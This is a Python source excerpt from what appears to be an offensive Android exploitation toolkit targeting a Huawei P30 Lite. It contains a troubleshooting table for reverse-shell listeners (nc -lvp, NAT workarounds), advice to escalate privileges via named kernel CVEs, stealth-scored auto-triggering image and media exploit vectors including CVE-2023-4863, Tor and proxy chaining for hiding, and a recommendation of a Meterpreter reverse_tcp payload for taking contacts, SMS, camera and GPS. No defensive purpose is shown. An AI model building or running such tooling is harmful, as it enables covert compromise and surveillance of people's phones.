...
ERROR_PATTERNS = [
    {
        ...
        "cause": "Reverse connection from target cannot reach your listener.",
        "fix": (
            "1. Verify LHOST reachable: curl ifconfig.me\n"
            "2. If behind NAT: use ngrok, VPS, or port forwarding\n"
            "3. Check firewall: ufw allow PORT\n"
            "4. Start listener first: nc -lvp PORT"
        ),
    },
    {
        "pattern": r"(no\s*route\s*to\s*host|network\s*is\s*unreachable|host\s*is\s*down)",
        "issue": "Network route unavailable",
        "severity": Severity.CRITICAL,
        "cause": "IP unreachable or routing broken.",
        "fix": (
            "1. Verify internet: ping 8.8.8.8\n"
            "2. Target carrier may block ports -> use 80, 443, 8080\n"
            "3. Use VPS for reliable public IP"
        ),
    },
    {
        "pattern": r"(execve|exec\s*format\s*error|bad\s*exec|ENOEXEC)",
        "issue": "Shellcode architecture mismatch",
        "severity": Severity.HIGH,
        "cause": "Payload architecture doesn't match target CPU (ARM64 needed).",
        "fix": (
            "1. Huawei P30 Lite = Kirin 710 = ARM64 (aarch64)\n"
            "2. Use --arch aarch64 --platform android\n"
    ...
    },
    {
        ...
        "cause": "Shellcode executed but action requires root.",
        "fix": (
            "1. Initial shell runs as app UID — EXPECTED\n"
            "2. You have foothold; now escalate:\n"
            "3. Check kernel: uname -a; cat /proc/version\n"
            "4. Try: CVE-2019-2215, CVE-2020-0041"
        ),
    },
    {
        ...
        "severity": Severity.HIGH,
        "cause": "Proxy dead, requires auth, or blocks target port.",
        "fix": (
            "1. Test: curl --proxy socks5://IP:PORT example.com\n"
            "2. Refresh: --fetch-proxies --min-anonymity HIA\n"
            "3. Use ports 80, 443 (some proxies block 4444)"
        ),
    },
    {
        ...
        "fix": "1. Use direct IP instead of hostname\n2. Check: nslookup HOST 8.8.8.8",
    },
    {
    ...
    },
    {
        ...
        "severity": Severity.CRITICAL,
        "cause": "Script corrupted from copy-paste or encoding issue.",
    ...
    },
    {
        ...
        "issue": "WebP file rejected as invalid",
        "severity": Severity.MEDIUM,
        "cause": "Exploit WebP fails format validation.",
        "fix": "1. Try --format png\n2. Use --heap-spray for reliability",
    },
    {
        ...
        "fix": "1. MediaScanner has permissive-ish context\n2. Use conservative syscalls",
    },
]
...
TARGET_PROFILES = {
    "huawei_p30_lite": {
        ...
        "notes": (
            ...
            "WebP vector is exceptionally reliable."
        ),
    },
}

ATTACK_VECTOR_SCORES = {
    "webp": {"base": 85, "auto_trigger": True, "stealth": 90, "reliability": 75,
             "description": "CVE-2023-4863: libwebp Huffman table overflow."},
    "png": {"base": 70, "auto_trigger": True, "stealth": 85, "reliability": 65,
            "description": "PNG chunk manipulation overflow."},
    "mp4": {"base": 60, "auto_trigger": True, "stealth": 40, "reliability": 55,
            "description": "Stagefright-style MP4 atom overflow."},
    "jpeg": {"base": 50, "auto_trigger": True, "stealth": 95, "reliability": 45,
             "description": "JPEG COM marker / EXIF IFD overflow."},
}
...
class AIAnalyzer:
    ...
    def _load_target(self, target_name: str):
        self.target_profile = TARGET_PROFILES.get(
            target_name, TARGET_PROFILES["huawei_p30_lite"]
        )
    ...
    def diagnose_error(self, error_text: str) -> List[Diagnosis]:
            ...
            try:
                if re.search(pattern["pattern"], error_lower, re.IGNORECASE):
                    ...
                    results.append(Diagnosis(
                        issue=pattern["issue"], severity=pattern["severity"],
                        cause=pattern["cause"], fix=pattern["fix"],
        ...
        if not results:
            results.append(Diagnosis(
                issue="Unknown error", severity=Severity.MEDIUM,
                cause="Error doesn't match any known pattern.",
                fix="1. Share full error\n2. Run with --debug\n3. Check logs",
                confidence=0.2,
            ))
    ...
    def _calculate_confidence(self, error_text: str, pattern: Dict) -> float:
        ...
        strong = ["connection refused", "timed out", "permission denied",
                  "no route to host", "ModuleNotFoundError"]
        for s in strong:
            if s in error_lower:
                confidence += 0.15
                break
    ...
    def test_connectivity(self, host: str, port: int,
        ...
        try:
            ...
            result["suggestion"] = f"Port {port} closed. Start: nc -lvp {port}"
        except socket.gaierror:
            result["error"] = "DNS resolution failed"
            result["suggestion"] = f"Cannot resolve '{host}'."
        except OSError as e:
            result["error"] = f"Network error: {e}"
            result["suggestion"] = "Check internet and firewall."
        return result
    ...
    def run_full_diagnostics(self, lhost: str = None,
        ...
        if not report["network"].get("internet", "").startswith("Connected"):
            recs.append("No internet — check WiFi/data")
        if lhost and lport and not report.get("network", {}).get(
            "listener_test", {}
        ).get("reachable", True):
    ...
    def suggest_proxy_strategy(self, need_stealth: bool = True,
        ...
        if need_stealth and need_speed:
            ...
            strategies.append({
                ...
                "setup": ("1. proxychains4 ssh root@VPS  # via Tor\n"
    ...
    def analyze_best_payload(self, target_arch: str = "aarch64",
        ...
        payloads = [
            ...
            {"name": "android/meterpreter/reverse_tcp", "type": "staged",
             ...
             "features": "Meterpreter: contacts, SMS, camera, GPS",
        ...
        return {
            ...
            "note": "For P30 Lite: start with Built-in Stager, upgrade later.",
        }
